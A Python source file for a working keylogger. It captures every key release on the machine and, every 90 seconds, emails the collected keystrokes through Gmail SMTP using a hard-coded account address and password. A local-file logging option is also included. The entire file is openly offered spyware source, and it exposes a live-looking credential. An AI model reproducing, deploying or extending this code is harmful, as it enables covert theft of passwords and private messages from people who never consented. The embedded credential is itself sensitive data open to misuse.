import keyboard
import smtplib  # for sending email using SMTP (simple mail transfer protocol), (gmail)
from threading import Timer
from datetime import datetime

# initializing parameters
import self as self

SEND_REPORT_EVERY = 90  # seconds
EMAIL_ADDRESS = "pythonkeylogger@gmail.com"
EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"


class KeyLogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval  # time between every report, defined by SEND_REPORT_EVERY
        self.report_method = report_method
        self.log = ""  # keystrokes stored here

        # record start and end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """"
        Is called whenver a keyboard event occurs ie.
        A key is released
        """
        name = event.name
        if len(name) > 1:  # if special key
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"  # add newline
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"  # formatted string literals

        self.log += name  # add to total log

    def update_filename(self):  # for filename to refelct start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
        Create log file in the current directory that contains current logs
        in 'self.log'
        """
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Sved {self.filename}.txt")

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # manages connection to SMTP server
        server.starttls()  # connect to the SMTP server as TLS mode (for security)
        server.login(email, password)  # login to email
        server.sendmail(email, email, message)  # send the message
        server.quit()  # end the session

    def report(self):
        """
        called every 'self.interval'
        Sends keylogs and resets 'self.log'
        """
        if self.log:  # if theres something in sel.log report it
            self.end_dt = datetime.now();
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            print(f"[{self.filename}] - {self.log}")  # print in console
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True # timer dies when main thread dies
        timer.start()

    def start(self):
        self.start_dt = datetime.now()  # record start time
        keyboard.on_release(callback=self.callback)  # start the keylogger
        self.report()  # report the keylogs
        keyboard.wait() # block the current thread


if __name__ == "__main__":
    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want the log to be recrd to a local file
    # keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()